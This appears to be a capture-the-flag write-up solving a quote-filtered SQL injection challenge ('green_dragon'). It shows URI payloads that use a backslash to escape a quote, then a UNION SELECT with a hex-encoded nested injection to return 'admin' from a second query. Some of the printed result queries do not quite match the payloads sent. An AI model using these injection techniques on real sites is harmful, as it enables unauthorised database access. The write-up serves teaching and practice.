---
custom_edit_url: null
sidebar_position: 25
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/a2a4e0ba-a94a-47b7-87fd-6b701374d2b8)

We are provided with two SQL queries:

```sql
SELECT id,pw FROM prob_green_dragon WHERE id='{$_GET[id]}' AND pw='{$_GET[pw]}'
```

```sql
SELECT id FROM prob_green_dragon WHERE id='{$result[id]}' AND pw='{$result[pw]}'
```

We cannot use single or double quotes in this challenge. Therefore, we need to find another way to modify the existing query.

Let's provide the following URI:

```
?id=\
```

The resultant query becomes:

```sql
SELECT id,pw FROM prob_green_dragon WHERE id='\' AND pw='{$_GET[pw]}'
```

As we can see, now the `\' AND pw=` part is being treated as a string. This is because the `\` character escapes the following character which was the closing single quote.

Anything we insert into the `?pw` parameter will thus be treated as code.

If we provide the following URI parameter:

```
?id=\&pw=UNION SELECT 1, 2 -- -

## id=\
## pw=UNION SELECT 1, 2 -- -
```

The resultant query becomes:

```sql
SELECT id,pw FROM prob_green_dragon WHERE id='\' AND pw=' UNION SELECT 1, 2 -- -'
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/67f050bb-24ab-453d-9d4c-482e23491d03)

Interestingly, we can see that the values in the `?pw` parameter (`1,2`) have been inserted in the second query.

```sql
SELECT id FROM prob_green_dragon WHERE id='1' AND pw='2'
```

Using the same technique, in order to convert part of the second query into a string.

We can provide the following URI:

```
?id=\&pw=UNION SELECT 0x5C, 0x554e494f4e2053454c45435420307836313634366436393665202d2d202d -- -

## ?id=\
## ?pw=UNION SELECT 0x5C, 0x554e494f4e2053454c45435420307836313634366436393665202d2d202d -- -
```

`0x554e494f4e2053454c45435420307836313634366436393665202d2d202d` is the Hexadecimal representation of `UNION SELECT 0x61646d696e -- -` and `0x5C` id Hexademical for `\`.

The resultant first query becomes:

```sql
SELECT id,pw FROM prob_green_dragon WHERE id='\' AND pw=' UNION SELECT \, UNION SELECT 0x61646d696e -- - -- -'
```

The resultant second query becomes:

```sql
SELECT id FROM prob_green_dragon WHERE id='1' AND pw='2' UNION SELECT 0x61646d696e -- -
```

![3](https://github.com/Kunull/Write-ups/assets/110326359/b3e82b2e-fb6d-4d6e-a363-e5b7526dcaf3)
